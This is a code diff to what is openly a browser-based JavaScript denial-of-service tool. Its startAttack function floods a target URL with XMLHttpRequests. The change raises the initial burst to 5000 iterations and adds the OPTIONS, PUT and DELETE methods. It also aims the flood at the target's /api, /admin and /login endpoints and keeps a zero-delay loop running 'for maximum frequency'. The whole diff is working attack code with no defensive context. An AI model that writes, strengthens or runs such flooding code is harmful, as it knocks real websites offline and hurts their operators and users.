@@ -84,9 +84,9 @@
         }
 
         function startAttack(targetURL) {
-            function sendRequest(method) {
+            function sendRequest(method, endpoint) {
                 const xhr = new XMLHttpRequest();
-                xhr.open(method, targetURL, true);
+                xhr.open(method, endpoint, true);
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4) {
                         consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
@@ -95,15 +95,27 @@
                 xhr.send();
             }
 
-            // Initial burst of 2000 requests for each method
-            for (let i = 0; i < 2000; i++) {
-                ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(method));
+            // Endpoints to target
+            const endpoints = [
+                targetURL,
+                `${targetURL}/api`,
+                `${targetURL}/admin`,
+                `${targetURL}/login`
+            ];
+
+            // Initial burst of 5000 requests for each method and endpoint
+            for (let i = 0; i < 5000; i++) {
+                ['HEAD', 'GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'].forEach(method => {
+                    endpoints.forEach(endpoint => sendRequest(method, endpoint));
+                });
             }
 
-            // Aggressive looping for each method
+            // Aggressive looping for each method and endpoint
             attackInterval = setInterval(() => {
-                ['HEAD', 'GET', 'POST'].forEach(method => sendRequest(method));
-            }, 0);
+                ['HEAD', 'GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'].forEach(method => {
+                    endpoints.forEach(endpoint => sendRequest(method, endpoint));
+                });
+            }, 0);  // Reduced interval to 0 for maximum frequency
         }
 
         function stopAttack() {
